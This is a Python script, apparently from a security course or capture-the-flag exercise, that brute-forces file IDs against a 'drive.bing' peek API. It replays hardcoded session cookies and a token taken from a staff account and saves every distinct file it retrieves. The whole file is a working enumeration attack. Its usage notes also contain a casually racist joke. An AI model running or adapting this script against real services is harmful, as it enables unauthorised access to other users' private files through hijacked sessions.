#!/usr/bin/python  

import sys  
import zlib
import time
import os
import requests
import re
from etaprogress.progress import ProgressBar


# def memeTime(self):
# Name mimicks active killdisk software name
# Also Bing, its not ethical to copycat Google's product !
#
# https://vignette.wikia.nocookie.net/ageofempires/images/7/70/KronosPortrait.png
# ^ my face when I find out Bing acts naughty again ARRRRR (jk)

def main():
	PROGRAM_NAME = "peekRive"
	HOW_TO = """
	1. Register an account on drive bing
	2. Gain admin rights using African voodoo
	3. Log in.
	4. Copy browser cookies to the script
	5. ...? Profit
	"""
	
	if len(sys.argv) != 3: # -1 = 2
		print(PROGRAM_NAME+" "+"Awaits you!")
		print("How to:")
		print(HOW_TO)
		print("USAGE: python "+PROGRAM_NAME+".py <min> <max>")
		print("For example: python "+PROGRAM_NAME+".py -1000 1000")
	else:
		# init
		# https://stackoverflow.com/a/16060908
		
		URL = "http://drive.bing.ns.agency/api/peek/file?file_id="
		brute_min = int(sys.argv[1])
		brute_max = int(sys.argv[2])
		SLEEP_TIME = 1/1000		
		
		logname = PROGRAM_NAME+"_"+str(int(time.time()))+".log"
		log = open(logname, "a+")
		
		# change the cookz below
		cookies = {
			"zid": "z5214048",
			"token": "ef992f23c1bbeeae8806204966c53e5b4207fb15d298f1cf269873a3d14f543f",
			"session": "eyJyb2xlIjoiU3RhZmYiLCJ1c2VybmFtZSI6IjEifQ.D3p-hQ.zv0SaZ_fsIUQh-WNkvjUyHx0c1k"
		}
		
		headers = {
			"Accept": "application/json",
			"Upgrade-Insecure-Requests": "1"
		}
		
		work = brute_max-brute_min
		bar = ProgressBar(work, max_width=40)
		
		# print for user
		print(PROGRAM_NAME+" initialised")

		print("stdout will be logged to "+logname)
		print("the bruteforce will start in 3s")
		# allow user to change mind
		time.sleep(3)
		
		#payload
		i = 0
		for i in range(work+1):
			k=i+brute_min
			
			k_string = str(k) # convertion to the text
			
			r = requests.get(URL+k_string, cookies=cookies, headers=headers)
			txt = r.text
			# https://docs.python.org/3/library/zlib.html SAYS
			#'An Adler-32 checksum is almost as reliable as a CRC32 but can be computed much more quickly'
			#'Changed in version 3.0: Always returns an unsigned value' => GOOD
			txt_hash = toHexCustom(zlib.adler32(txt.encode('utf-8')))
			
			# write to payload listings
			f_payload = open("pay_"+txt_hash+".txt", "a+")
			f_payload.write(k_string+"\n")
			f_payload.close()
			
			# if no transcription => first time resp encountered
			if not(os.path.isfile("plain_"+txt_hash+".txt")):
				# write to plaintext transcription
				f_plain = open("plain_"+txt_hash+".txt", "w+", encoding="utf-8")
				f_plain.write(txt)
				f_plain.close()
				
				log.write(txt)
				# now log stuff
				whatToLog = "[N]"+k_string+"; New hash found! Check file: "+"plain_"+txt_hash+".txt"
				
				log.write(whatToLog+"\n")
				print(whatToLog)
			
			# if hash already encountered
			else:
				# boring log, what else to do
				whatToLog = "[B]"+k_string+": "+txt_hash+" ("+str(r.status_code)+")"
				
				log.write(whatToLog+"\n")
				print(whatToLog)
				
			bar.numerator = i
			print(str(bar))
			#sys.stdout.flush()
			
			myCoolTitle = PROGRAM_NAME+" "+k_string
			os.system("title "+myCoolTitle) #https://stackoverflow.com/a/10229529
			#time.sleep(SLEEP_TIME/1000)
		
		#payload (for-loop) over
		whatToLog = "[F] Fin"
				
		log.write(whatToLog+"\n")
		print(whatToLog)
		
		log.close()

def toHexCustom(dec): 
	return str(hex(dec).split('x')[-1])	

if __name__ == '__main__':
	main()